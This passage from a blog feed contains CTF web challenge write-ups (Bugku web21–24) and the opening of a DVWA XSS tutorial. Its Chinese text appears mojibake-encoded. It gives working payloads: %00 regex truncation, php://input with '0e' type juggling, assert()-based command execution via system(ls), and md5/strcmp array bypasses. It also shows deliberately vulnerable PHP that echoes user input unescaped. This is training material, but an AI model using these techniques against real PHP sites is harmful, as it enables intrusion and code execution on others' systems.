class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">HTML</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">HEAD</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">SCRIPT</span> <span class="attr">LANGUAGE</span>=<span class="string">&quot;Javascript&quot;</span>&gt;</span></span><br><span class="line">&lt;!--</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> Words =<span class="string">&quot;%3Cscript%3Ewindow.location.href%3D&#x27;http%3A%2F%2Fwww.bugku.com&#x27;%3B%3C%2Fscript%3E%20%0A%3C!--JTIyJTNCaWYoISUyNF9HRVQlNUInaWQnJTVEKSUwQSU3QiUwQSUwOWhlYWRlcignTG9jYXRpb24lM0ElMjBoZWxsby5waHAlM0ZpZCUzRDEnKSUzQiUwQSUwOWV4aXQoKSUzQiUwQSU3RCUwQSUyNGlkJTNEJTI0X0dFVCU1QidpZCclNUQlM0IlMEElMjRhJTNEJTI0X0dFVCU1QidhJyU1RCUzQiUwQSUyNGIlM0QlMjRfR0VUJTVCJ2InJTVEJTNCJTBBaWYoc3RyaXBvcyglMjRhJTJDJy4nKSklMEElN0IlMEElMDllY2hvJTIwJ25vJTIwbm8lMjBubyUyMG5vJTIwbm8lMjBubyUyMG5vJyUzQiUwQSUwOXJldHVybiUyMCUzQiUwQSU3RCUwQSUyNGRhdGElMjAlM0QlMjAlNDBmaWxlX2dldF9jb250ZW50cyglMjRhJTJDJ3InKSUzQiUwQWlmKCUyNGRhdGElM0QlM0QlMjJidWdrdSUyMGlzJTIwYSUyMG5pY2UlMjBwbGF0ZWZvcm0hJTIyJTIwYW5kJTIwJTI0aWQlM0QlM0QwJTIwYW5kJTIwc3RybGVuKCUyNGIpJTNFNSUyMGFuZCUyMGVyZWdpKCUyMjExMSUyMi5zdWJzdHIoJTI0YiUyQzAlMkMxKSUyQyUyMjExMTQlMjIpJTIwYW5kJTIwc3Vic3RyKCUyNGIlMkMwJTJDMSkhJTNENCklMEElN0IlMEElMDklMjRmbGFnJTIwJTNEJTIwJTIyZmxhZyU3QioqKioqKioqKioqJTdEJTIyJTBBJTdEJTBBZWxzZSUwQSU3QiUwQSUwOXByaW50JTIwJTIybmV2ZXIlMjBuZXZlciUyMG5ldmVyJTIwZ2l2ZSUyMHVwJTIwISEhJTIyJTNCJTBBJTdEJTBBJTBBJTBBJTNGJTNF--%3E&quot;</span> </span></span><br><span class="line"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">OutWord</span>(<span class="params"></span>)</span></span></span><br><span class="line">&#123;</span><br><span class="line"><span class="javascript"><span class="keyword">var</span> NewWords;</span></span><br><span class="line"><span class="javascript">NewWords = <span class="built_in">unescape</span>(Words);</span></span><br><span class="line"><span class="javascript"><span class="built_in">document</span>.write(NewWords);</span></span><br><span class="line">&#125; </span><br><span class="line">OutWord();</span><br><span class="line"><span class="javascript"><span class="comment">// --&gt;</span></span></span><br><span class="line"><span class="tag">&lt;/<span class="name">SCRIPT</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">HEAD</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">BODY</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">BODY</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">HTML</span>&gt;</span></span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬çœ‹åˆ°wordä¸€å¤§ä¸²å­—ç¬¦ä¸²å¾ˆå¯ç–‘ï¼Œç»“åˆåé¢çš„unescape()å‡½æ•°ï¼Œæ–­å®šè¿™é‡Œè¢«ç¼–ç äº†</p><p>ç”¨burpè§£ç ï¼Œé¡ºåºä¸ºï¼šurlè§£ç ï¼Œbase64è§£ç ï¼Œå†urlè§£ç </p><p><img src="/bugku/10.png" alt="10"></p><p>æœ€ç»ˆå¾—</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--<span class="string">&quot;;if(!<span class="subst">$_GET</span>[&#x27;id&#x27;])</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">header(&#x27;Location: hello.php?id=1&#x27;);</span></span><br><span class="line"><span class="string">exit();</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"><span class="subst">$id</span>=<span class="subst">$_GET</span>[&#x27;id&#x27;];</span></span><br><span class="line"><span class="string"><span class="subst">$a</span>=<span class="subst">$_GET</span>[&#x27;a&#x27;];</span></span><br><span class="line"><span class="string"><span class="subst">$b</span>=<span class="subst">$_GET</span>[&#x27;b&#x27;];</span></span><br><span class="line"><span class="string">if(stripos(<span class="subst">$a</span>,&#x27;.&#x27;))</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">echo &#x27;no no no no no no no&#x27;;</span></span><br><span class="line"><span class="string">return ;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"><span class="subst">$data</span> = @file_get_contents(<span class="subst">$a</span>,&#x27;r&#x27;);</span></span><br><span class="line"><span class="string">if(<span class="subst">$data</span>==&quot;</span>bugku is a nice plateform!<span class="string">&quot; and <span class="subst">$id</span>==0 and strlen(<span class="subst">$b</span>)&gt;5 and eregi(&quot;</span><span class="number">111</span><span class="string">&quot;.substr(<span class="subst">$b</span>,0,1),&quot;</span><span class="number">1114</span><span class="string">&quot;) and substr(<span class="subst">$b</span>,0,1)!=4)</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string"><span class="subst">$flag</span> = &quot;</span>flag&#123;***********&#125;<span class="string">&quot;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">else</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">print &quot;</span>never never never give up !!!<span class="string">&quot;;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">?&gt;--&gt;</span></span><br></pre></td></tr></table></figure><ul><li><p>file_get_contents() å‡½æ•°ï¼šæŠŠæ•´ä¸ªæ–‡ä»¶è¯»å…¥ä¸€ä¸ªå­—ç¬¦ä¸²ä¸­ã€‚</p></li><li><p>eregi()</p><p>ä½œç”¨ï¼šä¸åˆ†å¤§å°å†™çš„æ­£åˆ™è¡¨è¾¾å¼åŒ¹é…â€”â€”åœ¨ <code>string</code> ä¸­å¯»æ‰¾ä¸ç»™å®šçš„æ­£åˆ™è¡¨è¾¾å¼ <code>pattern</code> æ‰€åŒ¹é…çš„å­ä¸²ã€‚</p><p>è¯­æ³•ï¼šereg ( string <code>$pattern</code> , string <code>$string</code> , array <code>&amp;$regs</code> = ? ) </p></li></ul><p>ä»£ç å®¡è®¡ï¼šå½“idä¸ºç©ºæ—¶ï¼Œç½‘é¡µè‡ªåŠ¨è·³è½¬åˆ°æŒ‡å®šæ–‡ä»¶ï¼›å‚æ•°<code>a</code>ä¸­ä¸å¾—æœ‰<code>.</code>ï¼Œå¦åˆ™è¾“å‡ºâ€˜noâ€™ï¼ˆè¿™é™åˆ¶äº†æˆ‘ä»¬ç›´æ¥å¯¼å…¥æ–‡ä»¶ï¼‰ï¼›æ¥ç€å°†açš„å€¼èµ‹å€¼ç»™å‚æ•°dataï¼›ifæ¡ä»¶è§„å®šï¼šdataçš„å€¼ä¸º<code>bugku is a nice plateform!</code>ï¼Œidçš„å€¼ä¸º0ï¼Œbå€¼çš„é•¿åº¦å¤§äº5ï¼Œç„¶å<code>111</code>å’Œbå€¼çš„ç¬¬ä¸€ä¸ªå­—ç¬¦ç»“åˆä¸<code>1114</code>è¿›è¡ŒåŒ¹é…ï¼Œå¹¶ä¸”bå€¼çš„ç¬¬ä¸€ä¸ªå­—ç¬¦ä¸èƒ½æ˜¯4ã€‚</p><p>eregå’Œeregiçš„æˆªæ–­æ¼æ´ï¼š%00æˆªæ–­åŠé‡åˆ°%00åˆ™é»˜è®¤ä¸ºå­—ç¬¦ä¸²çš„ç»“æŸã€‚å› æ­¤æˆ‘ä»¬æ„é€ b=%0023456</p><p>phpä¸­ä¼šæŠŠid=0å½“æˆid=nothingï¼Œä¹Ÿå°±æ˜¯ç©ºç™½ã€‚é‚£ä¹ˆè¿™é¢˜<code>!$_GET[&#39;id&#39;]</code>å’Œ<code>$id==0</code>æ˜æ˜¾å†²çªçŸ›ç›¾ï¼Œè¿™æ—¶æˆ‘ä»¬è¦æƒ³åˆ°PHPåœ¨å¤„ç†å“ˆå¸Œå­—ç¬¦ä¸²æ—¶ï¼Œä¼šåˆ©ç”¨â€!=â€æˆ–â€==â€æ¥å¯¹å“ˆå¸Œå€¼è¿›è¡Œæ¯”è¾ƒï¼Œå®ƒæŠŠæ¯ä¸€ä¸ªä»¥â€0Eâ€å¼€å¤´çš„å“ˆå¸Œå€¼éƒ½è§£é‡Šä¸º0ï¼Œæ‰€ä»¥å¦‚æœä¸¤ä¸ªä¸åŒçš„å¯†ç ç»è¿‡å“ˆå¸Œä»¥åï¼Œå…¶å“ˆå¸Œå€¼éƒ½æ˜¯ä»¥â€0Eâ€å¼€å¤´çš„ï¼Œé‚£ä¹ˆPHPå°†ä¼šè®¤ä¸ºä»–ä»¬ç›¸åŒï¼Œéƒ½æ˜¯0ã€‚å› æ­¤æˆ‘ä»¬å¯ä»¥æ„é€ ï¼š<code>?id=0e1</code></p><p>ç”±äºifæ¡ä»¶è§„å®šï¼šdataçš„å€¼ä¸º<code>bugku is a nice plateform!</code>å› æ­¤æˆ‘ä»¬å¯ä»¥åˆ©ç”¨php://inputè·å–postä¸Šä¼ æ•°æ®çš„ç‰¹ç‚¹ï¼Œ</p><p>ä»¤<code>?a=php://input</code>å¹¶postæ•°æ®<code>bugku is a nice plateform!</code></p><p>ç»¼ä¸Šæ‰€è¿°ï¼špayload=?id=0e1&amp;a=php://input&amp;b=%0023456 å¹¶postæ•°æ®<code>bugku is a nice plateform!</code></p><p><img src="/bugku/11.png" alt="11"></p><h1 id="web22ï¼ˆassert-å‡½æ•°æ¼æ´åˆ©ç”¨ï¼‰"><a href="#web22ï¼ˆassert-å‡½æ•°æ¼æ´åˆ©ç”¨ï¼‰" class="headerlink" title="web22ï¼ˆassert()å‡½æ•°æ¼æ´åˆ©ç”¨ï¼‰"></a>web22ï¼ˆassert()å‡½æ•°æ¼æ´åˆ©ç”¨ï¼‰</h1><p>ç‚¹å¼€é¢˜ç›®å‘ç°é¢˜ç›®æè¿°é‚£æ®µè¯ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$poc&#x3D;&quot;a#s#s#e#r#t&quot;; </span><br><span class="line">$poc_1&#x3D;explode(&quot;#&quot;,$poc);  </span><br><span class="line">$poc_2&#x3D;$poc_1[0].$poc_1[1].$poc_1[2].$poc_1[3].$poc_1[4].$poc_1[5];  </span><br><span class="line">$poc_2($_GET[&#39;s&#39;])</span><br></pre></td></tr></table></figure><p> ä»¥ä¸Šä»£ç æœ€ç»ˆç­‰ä»·æ‰§è¡Œè¯­å¥ï¼š<code>assert($_GET[&#39;s&#39;])</code></p><p>è¡¥å……ï¼šassert()å‡½æ•°ä¼šå°†æ‹¬å·å†…çš„å­—ç¬¦ä¸²å½“ä½œphpä»£ç æ‰§è¡Œã€‚</p><p>è¯¦æƒ…å‚è€ƒï¼š<code>https://www.smi1e.top/%E6%B5%85%E8%B0%88eval%E5%92%8Cassert/</code></p><p>é‚£ä¹ˆæˆ‘ä»¬å¯ä»¥æ ¹æ®assert()å‡½æ•°çš„ç‰¹æ€§ï¼Œæ„é€ payloadï¼š<code>?s=system(ls)æˆ–?s=system(dir)</code></p><p><img src="/bugku/19.png" alt="19"></p><p>è®¿é—®<code>flaga15808abee46a1d5.txt</code>ï¼Œå¾—flag</p><h1 id="web23ï¼šï¼ˆæ­£åˆ™è¡¨è¾¾å¼ï¼‰"><a href="#web23ï¼šï¼ˆæ­£åˆ™è¡¨è¾¾å¼ï¼‰" class="headerlink" title="web23ï¼šï¼ˆæ­£åˆ™è¡¨è¾¾å¼ï¼‰"></a>web23ï¼šï¼ˆæ­£åˆ™è¡¨è¾¾å¼ï¼‰</h1><p>æ‰“å¼€é¢˜ç›®åœ°å€ï¼š<img src="/bugku/21.png" alt="21"></p><p>æˆ‘ä»¬çœ‹åˆ°ä¸€ä¸ªæ­£åˆ™è¡¨è¾¾å¼ï¼š<code>/key.*key.&#123;4,7&#125;key:\/.\/(.*key)[a-z][[:punct:]]/i</code>ï¼Œå½“æˆ‘ä»¬è¾“å…¥çš„idå€¼æ»¡è¶³æ­£åˆ™åŒ¹é…æ˜¯ä¼šè¾“å‡ºflag</p><p>æˆ‘ä»¬å¯ä»¥æŠŠè¿™ä¸ªæ­£åˆ™è¡¨è¾¾å¼æ‹†åˆ†æˆï¼š<code>key</code> <code>.</code> <code>*</code> <code>key</code> <code>.&#123;4,7&#125;</code> <code>key</code> <code>:</code> <code>/</code> <code>.</code> <code>/</code> <code>.</code> <code>*</code> <code>key</code> <code>[a-z]</code> <code>[[:punct:]]</code></p><p>åˆ†æï¼ˆä»å·¦åˆ°å³ï¼‰ï¼š</p><p><code>key</code>â€”â€”å°±æ˜¯key</p><p><code>.</code> â€”â€”ä»»æ„å­—ç¬¦</p><p><code>*</code>â€”â€”åŒ¹é…å‰é¢çš„å­è¡¨è¾¾å¼é›¶æ¬¡æˆ–å¤šæ¬¡</p><p><code>key</code>â€”â€”å°±æ˜¯key</p><p><code>.&#123;4,7&#125;</code>â€”â€”åŒ¹é…ä»»æ„å­—ç¬¦4åˆ°7æ¬¡</p><p><code>key</code>â€”â€”å°±æ˜¯key</p><p><code>:</code>â€”â€”å°±æ˜¯<code>:</code></p><p><code>/</code>â€”â€”å°±æ˜¯<code>/</code></p><p><code>.</code> â€”â€”ä»»æ„å­—ç¬¦</p><p><code>/</code>â€”â€”å°±æ˜¯<code>/</code></p><p><code>.</code> â€”â€”ä»»æ„å­—ç¬¦</p><p><code>*</code>â€”â€”åŒ¹é…å‰é¢çš„å­è¡¨è¾¾å¼é›¶æ¬¡æˆ–å¤šæ¬¡</p><p><code>key</code>â€”â€”å°±æ˜¯key</p><p><code>[a-z]</code>â€”â€”åŒ¹é…a-zä¹‹é—´çš„å­—æ¯</p><p><code>[[:punct:]]</code>â€”â€”åŒ¹é…ä»»æ„æ ‡ç‚¹ç¬¦å·</p><p>ä¾æ¬¡æˆ‘ä»¬æ„é€ payloadï¼Œä»¥getçš„æ–¹å¼ä¼ å‚idï¼š<code>?id=key1key1111key:/1/1keya!</code>     ï¼ˆpayloadä¸å”¯ä¸€ï¼‰</p><h1 id="web24ï¼šï¼ˆmd5ç»•è¿‡-strcmpå‡½æ•°ç»•è¿‡ï¼‰"><a href="#web24ï¼šï¼ˆmd5ç»•è¿‡-strcmpå‡½æ•°ç»•è¿‡ï¼‰" class="headerlink" title="web24ï¼šï¼ˆmd5ç»•è¿‡+strcmpå‡½æ•°ç»•è¿‡ï¼‰"></a>web24ï¼šï¼ˆmd5ç»•è¿‡+strcmpå‡½æ•°ç»•è¿‡ï¼‰</h1><p>æ‰“å¼€é¢˜ç›®åœ°å€ï¼ŒæŸ¥çœ‹æºç ï¼š<img src="/C:/Users\Lenovo\Desktop\blog\hexo\source_posts\bugku\22.png" alt="22"></p><p>ç‚¹å¼€code.txt<img src="/C:/Users\Lenovo\Desktop\blog\hexo\source_posts\bugku\23.png" alt="23"></p><p>æˆ‘ä»¬çœ‹åˆ°æœ‰ä¸‰ä¸ªå‚æ•°ï¼šv1,v2,v3</p><p>è¦æ»¡è¶³æ¡ä»¶ï¼š</p><p>1.<code>v1!=v2</code></p><p>2.<code>md5(v1)=mad5(v2)</code></p><p>3.<code>v3çš„å€¼ç­‰äºflag</code></p><ul><li>ç»•æ¡ä»¶1,2</li></ul><p>æ³•1ï¼šé€šè¿‡æ•°ç»„ç»•è¿‡md5å‡½æ•°åŠ å¯†ï¼Œå¦‚<code>v1[]=1,v2[]=2</code></p><p>æ³•2ï¼šåˆ©ç”¨phpå¼±å£ä»¤ç‰¹æ€§ï¼Œä¼šå°†0eå¼€å¤´çš„å“ˆå¸Œå€¼éƒ½è§£æä¸º0ã€‚å¸¸è§çš„md5åŠ å¯†åä»¥0eå¼€å¤´çš„å­—ç¬¦ä¸²ï¼š240610708ã€QNKCDZOã€aabg7XSsã€aabC9RqSç­‰</p><ul><li>ç»•è¿‡æ¡ä»¶3</li></ul><p>åˆ©ç”¨strcmpå‡½æ•°ä¸èƒ½æ¯”è¾ƒæ•°ç»„ï¼ˆæ¯”è¾ƒæ•°ç»„è¿”å›ä¸ºç©ºï¼ŒåŠé›¶ï¼‰ï¼Œæ„é€ v3[]=flag</p><p><strong>ç»¼ä¸Šï¼Œæ„é€ flagï¼š</strong><code>?v1[]=1&amp;v2[]=2&amp;v3[]=flag</code>æˆ–<code>?v1=240610708&amp;v2=QNKCDZO&amp;v3[]=flag</code></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;web11ï¼šï¼ˆå¾¡å‰‘æ‰«æåç«¯ï¼‰&quot;&gt;&lt;a href=&quot;#web11ï¼šï¼ˆå¾¡å‰‘æ‰«æåç«¯ï¼‰&quot; class=&quot;headerlink&quot; title=&quot;web11ï¼šï¼ˆå¾¡å‰‘æ‰«æåç«¯ï¼‰&quot;&gt;&lt;/a&gt;web11ï¼šï¼ˆå¾¡å‰‘æ‰«æåç«¯ï¼‰&lt;/h1&gt;&lt;p&gt; è¿™é¢˜çš„é¢˜ç›®æ˜¯ï¼šç½‘ç«™è¢«é»‘äº† é»‘å®¢ä¼šä¸ä¼šç•™ä¸‹å</summary>
      
    
    
    
    
    <category term="åˆ·é¢˜" scheme="http://example.com/tags/%E5%88%B7%E9%A2%98/"/>
    
  </entry>
  
  <entry>
    <title>DVWAâ€”XSS</title>
    <link href="http://example.com/2021/03/13/DVWA%E2%80%94XSS/"/>
    <id>http://example.com/2021/03/13/DVWA%E2%80%94XSS/</id>
    <published>2021-03-13T02:35:57.000Z</published>
    <updated>2021-03-15T14:52:58.591Z</updated>
    
    <content type="html"><![CDATA[<h1 id="å‰è¨€ï¼š"><a href="#å‰è¨€ï¼š" class="headerlink" title="å‰è¨€ï¼š"></a>å‰è¨€ï¼š</h1><p>â€”ï¼‰XSSçš„ä¸­æ–‡åç§°å«è·¨ç«™è„šæœ¬ï¼Œæ˜¯WEBæ¼æ´ä¸­æ¯”è¾ƒå¸¸è§çš„ä¸€ç§ï¼Œç‰¹ç‚¹å°±æ˜¯å¯ä»¥å°†æ¶æ„HTML/JavaScriptä»£ç æ³¨å…¥åˆ°å—å®³ç”¨æˆ·æµè§ˆçš„ç½‘é¡µä¸Šï¼Œä»è€Œè¾¾åˆ°åŠ«æŒç”¨æˆ·ä¼šè¯çš„ç›®çš„ã€‚å®é™…åº”ç”¨ä¸­xsså¯ä»¥å®Œæˆå¾ˆå¤šæ“ä½œï¼Œè¿™é‡Œä¸¾ä¸¤ä¸ªä¾‹å­ã€‚</p><ul><li><strong>çªƒå–ç½‘é¡µæµè§ˆä¸­çš„cookieå€¼</strong></li></ul><p>åœ¨ç½‘é¡µæµè§ˆä¸­æˆ‘ä»¬å¸¸å¸¸æ¶‰åŠåˆ°ç”¨æˆ·ç™»å½•ï¼Œç™»å½•å®Œæ¯•ä¹‹åæœåŠ¡ç«¯ä¼šè¿”å›ä¸€ä¸ªcookieå€¼ã€‚è¿™ä¸ªcookieå€¼ç›¸å½“äºä¸€ä¸ªä»¤ç‰Œï¼Œæ‹¿ç€è¿™å¼ ä»¤ç‰Œå°±ç­‰åŒäºè¯æ˜äº†ä½ æ˜¯æŸä¸ªç”¨æˆ·ã€‚</p><p>å¦‚æœä½ çš„cookieå€¼è¢«çªƒå–ï¼Œé‚£ä¹ˆæ”»å‡»è€…å¾ˆå¯èƒ½èƒ½å¤Ÿç›´æ¥åˆ©ç”¨ä½ çš„è¿™å¼ ä»¤ç‰Œä¸ç”¨å¯†ç å°±ç™»å½•ä½ çš„è´¦æˆ·ã€‚å¦‚æœæƒ³è¦é€šè¿‡scriptè„šæœ¬è·å¾—å½“å‰é¡µé¢çš„cookieå€¼ï¼Œé€šå¸¸ä¼šç”¨åˆ°document.cookieã€‚</p><p>è¯•æƒ³ä¸‹å¦‚æœåƒç©ºé—´è¯´è¯´ä¸­èƒ½å¤Ÿå†™å…¥xssæ”»å‡»è¯­å¥ï¼Œé‚£å²‚ä¸æ˜¯çœ‹äº†ä½ è¯´è¯´çš„äººçš„å·ä½ éƒ½å¯ä»¥ç™»å½•ï¼ˆä¸è¿‡æŸäº›å‚å•†çš„cookieæœ‰å…¶ä»–éªŒè¯æªæ–½å¦‚ï¼šHttp-Onlyä¿è¯åŒä¸€cookieä¸èƒ½è¢«æ»¥ç”¨ï¼‰</p><ul><li><strong>åŠ«æŒæµé‡å®ç°æ¶æ„è·³è½¬</strong></li></ul><p>è¿™ä¸ªå¾ˆç®€å•ï¼Œå°±æ˜¯åœ¨ç½‘é¡µä¸­æƒ³åŠæ³•æ’å…¥ä¸€å¥åƒè¿™æ ·çš„è¯­å¥ï¼š</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="built_in">window</span>.location.href=<span class="string">&quot;http://www.baidu.com&quot;</span>;&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>é‚£ä¹ˆæ‰€è®¿é—®çš„ç½‘ç«™å°±ä¼šè¢«è·³è½¬åˆ°ç™¾åº¦çš„é¦–é¡µã€‚ã€æ‘˜è‡ª<a href="https://zhuanlan.zhihu.com/p/26177815%E3%80%91">https://zhuanlan.zhihu.com/p/26177815ã€‘</a></p><p>â€”ï¼‰XSSæ ¹æ®æ¶æ„è„šæœ¬çš„ä¼ é€’æ–¹å¼å¯ä»¥åˆ†ä¸º3ç§ï¼Œåˆ†åˆ«ä¸ºåå°„å‹ã€å­˜å‚¨å‹ã€DOMå‹ï¼Œå‰é¢ä¸¤ç§æ¶æ„è„šæœ¬éƒ½ä¼šç»è¿‡æœåŠ¡å™¨ç«¯ç„¶åè¿”å›ç»™å®¢æˆ·ç«¯ï¼Œç›¸å¯¹DOMå‹æ¥è¯´æ¯”è¾ƒå¥½æ£€æµ‹ä¸é˜²å¾¡ï¼Œè€ŒDOMå‹ä¸ç”¨å°†æ¶æ„è„šæœ¬ä¼ è¾“åˆ°æœåŠ¡å™¨åœ¨è¿”å›å®¢æˆ·ç«¯ã€‚</p><ul><li><p><strong>DOM-based XSSï¼š</strong>æ¼æ´æ˜¯åŸºäºæ–‡æ¡£å¯¹è±¡æ¨¡å‹Document Objeet Modelï¼ŒDOM)çš„ä¸€ç§æ¼æ´ã€‚DOMæ˜¯ä¸€ä¸ªä¸å¹³å°ã€ç¼–ç¨‹è¯­è¨€æ— å…³çš„æ¥å£ï¼Œå®ƒå…è®¸ç¨‹åºæˆ–è„šæœ¬åŠ¨æ€åœ°è®¿é—®å’Œæ›´æ–°æ–‡æ¡£å†…å®¹ã€ç»“æ„å’Œæ ·å¼ï¼Œå¤„ç†åçš„ç»“æœèƒ½å¤Ÿæˆä¸ºæ˜¾ç¤ºé¡µé¢çš„ä¸€éƒ¨åˆ†ã€‚DOMä¸­æœ‰å¾ˆå¤šå¯¹è±¡ï¼Œå…¶ä¸­ä¸€äº›æ˜¯ç”¨æˆ·å¯ä»¥æ“çºµçš„ï¼Œå¦‚urlï¼Œlocationï¼Œrefererç­‰ã€‚å®¢æˆ·ç«¯çš„è„šæœ¬ç¨‹åºå¯ä»¥é€šè¿‡DOMåŠ¨æ€åœ°æ£€æŸ¥å’Œä¿®æ”¹é¡µé¢å†…å®¹ï¼Œå®ƒä¸ä¾èµ–äºæäº¤æ•°æ®åˆ°æœåŠ¡å™¨ç«¯ï¼Œè€Œä»å®¢æˆ·ç«¯è·å¾—DOMä¸­çš„æ•°æ®åœ¨æœ¬åœ°æ‰§è¡Œï¼Œå¦‚æœDOMä¸­çš„æ•°æ®æ²¡æœ‰ç»è¿‡ä¸¥æ ¼ç¡®è®¤ï¼Œå°±ä¼šäº§ç”ŸDOM-based XSSæ¼æ´ã€‚</p></li><li><p><strong>åå°„å‹XSSï¼š</strong>&lt;éæŒä¹…åŒ–&gt; æ”»å‡»è€…äº‹å…ˆåˆ¶ä½œå¥½æ”»å‡»é“¾æ¥, éœ€è¦æ¬ºéª—ç”¨æˆ·è‡ªå·±å»ç‚¹å‡»é“¾æ¥æ‰èƒ½è§¦å‘XSSä»£ç ï¼ˆæœåŠ¡å™¨ä¸­æ²¡æœ‰è¿™æ ·çš„é¡µé¢å’Œå†…å®¹ï¼‰ï¼Œä¸€èˆ¬å®¹æ˜“å‡ºç°åœ¨æœç´¢é¡µé¢ã€‚</p></li><li><p><strong>å­˜å‚¨å‹XSSï¼š</strong>&lt;æŒä¹…åŒ–&gt; ä»£ç æ˜¯å­˜å‚¨åœ¨æœåŠ¡å™¨ä¸­çš„ï¼Œå¦‚åœ¨ä¸ªäººä¿¡æ¯æˆ–å‘è¡¨æ–‡ç« ç­‰åœ°æ–¹ï¼ŒåŠ å…¥ä»£ç ï¼Œå¦‚æœæ²¡æœ‰è¿‡æ»¤æˆ–è¿‡æ»¤ä¸ä¸¥ï¼Œé‚£ä¹ˆè¿™äº›ä»£ç å°†å‚¨å­˜åˆ°æœåŠ¡å™¨ä¸­ï¼Œæ¯å½“æœ‰ç”¨æˆ·è®¿é—®è¯¥é¡µé¢çš„æ—¶å€™éƒ½ä¼šè§¦å‘ä»£ç æ‰§è¡Œï¼Œè¿™ç§XSSéå¸¸å±é™©ï¼Œå®¹æ˜“é€ æˆè •è™«ï¼Œå¤§é‡ç›—çªƒcookieï¼ˆè™½ç„¶è¿˜æœ‰ç§DOMå‹XSSï¼Œä½†æ˜¯ä¹Ÿè¿˜æ˜¯åŒ…æ‹¬åœ¨å­˜å‚¨å‹XSSå†…ï¼‰ã€‚</p></li></ul><p>  ä½œè€…ï¼šJewel591<br>  é“¾æ¥ï¼š<a href="https://www.jianshu.com/p/4fcb4b411a66">https://www.jianshu.com/p/4fcb4b411a66</a><br>  æ¥æºï¼šç®€ä¹¦<br>  è‘—ä½œæƒå½’ä½œè€…æ‰€æœ‰ã€‚å•†ä¸šè½¬è½½è¯·è”ç³»ä½œè€…è·å¾—æˆæƒï¼Œéå•†ä¸šè½¬è½½è¯·æ³¨æ˜å‡ºå¤„ã€‚</p><h1 id="Reflected"><a href="#Reflected" class="headerlink" title="Reflected"></a>Reflected</h1><h2 id="Lowï¼š"><a href="#Lowï¼š" class="headerlink" title="Lowï¼š"></a>Lowï¼š</h2><p>æŸ¥çœ‹æºç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">header (<span class="string">&quot;X-XSS-Protection: 0&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span>( array_key_exists( <span class="string">&quot;name&quot;</span>, $_GET ) &amp;&amp; $_GET[ <span class="string">&#x27;name&#x27;</span> ] != <span class="literal">NULL</span> ) &#123;</span><br><span class="line">    <span class="comment">// Feedback for end user</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;Hello &#x27;</span> . $_GET[ <span class="string">&#x27;name&#x27;</span> ] . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><ul><li><p>æ–°å‡½æ•°</p><p>array_key_exists()å‡½æ•°</p><p>åŠŸèƒ½ï¼šæ£€æŸ¥æŸä¸ªæ•°ç»„ä¸­æ˜¯å¦å­˜åœ¨æŒ‡å®šçš„é”®åï¼Œå¦‚æœé”®åå­˜åœ¨åˆ™è¿”å› trueï¼Œå¦‚æœé”®åä¸å­˜åœ¨åˆ™è¿”å› falseã€‚</p><p>è¯­æ³•ï¼šarray_key_exists(<em>key,array</em>)</p><table><thead><tr><th align="left">å‚æ•°</th><th align="left">æè¿°</th></tr></thead><tbody><tr><td align="left"><em>key</em></td><td align="left">å¿…éœ€ã€‚è§„å®šé”®åã€‚</td></tr><tr><td align="left"><em>array</em></td><td 